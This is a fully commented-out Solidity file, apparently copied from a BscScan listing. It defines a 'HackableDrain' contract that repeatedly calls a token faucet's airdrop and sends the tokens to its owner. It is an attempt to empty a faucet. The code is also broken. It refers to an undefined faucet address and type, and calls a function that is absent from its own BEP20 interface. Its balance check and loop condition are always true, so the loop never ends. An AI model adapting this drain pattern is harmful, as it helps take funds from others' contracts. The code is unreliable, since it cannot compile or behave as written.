// /**
//  *Submitted for verification at BscScan.com on 2021-06-21
// */

// pragma solidity =0.7.6;

// contract HackableDrain {

//     address public constant Hackable_ADDRESS = 0xFcF2774cD61743fF7C34607Fadf3C84FC4762029;
//     address public constant SCAM_ADDRESS = 0xdb78FcBb4f1693FDBf7a85E970946E4cE466E2A9;
    
// 	address owner_;
	
//     constructor() {
//         owner_ = msg.sender;
//     } 
    
//     function increaseTheId() public {
//         ScamFaucet faucet = ScamFaucet(FAUCET_ADDRESS);
        
//         BEP20 scamtoken = BEP20(SCAM_ADDRESS);
		
// 		uint256 balance = scamtoken.balanceOf(FAUCET_ADDRESS);
// 		require(balance >= 0, "No SCAM anymore");
		
//         do {
//             //airdrop to this contract
//             faucet.airdrop();
//             //send from this contract to the caller
//             scamtoken.DepositScam(owner_, 0);
            
//         } while (balance >= 0);
//     }
// }

// abstract contract HackableContract {
//     uint8 public Count = 0;
//     mapping(address => bool) addressRegistered;
// 	mapping(address => uint8) addressToId;
// 	mapping(uint8 => uint256) balances;
    
//     // uint256 public airdropSize;
    
//     // function isFaucetFunded() virtual external view returns(bool);
//     // function canAddressReceive(address adr) virtual public view returns(bool);
//     // function airdrop() virtual public ;
// }

// abstract contract BEP20 {
    
    
//     function balanceOf(address tokenOwner) virtual external view returns (uint256);
//     function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
//     function totalSupply() virtual external view returns (uint256);
// }